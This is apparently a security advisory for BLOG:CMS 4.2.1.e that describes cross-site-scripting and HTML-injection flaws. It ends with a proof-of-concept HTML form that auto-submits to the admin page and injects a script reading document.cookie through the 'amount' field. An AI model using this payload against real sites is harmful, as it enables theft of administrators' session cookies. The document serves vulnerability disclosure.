BLOG:CMS is prone to a cross-site-scripting vulnerability and multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.

Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

BLOG:CMS 4.2.1.e is vulnerable; prior versions may also be affected.

Cross Site Scripting POCs:

<form action="http://host/admin/index.php" method="post" name="main">
<input type="hidden" name="blogid" value="0">
<input type="hidden" name="itemid" value="0">
<input type="hidden" name="action" value="browseowncomments">
<input type="hidden" name="amount" value=&#039;10"><script>alert(document.cookie)</script>&#039;>
<input type="hidden" name="start" value="0">
<input type="hidden" name="search" value="">
</form>
<script>
document.main.submit();
</script>
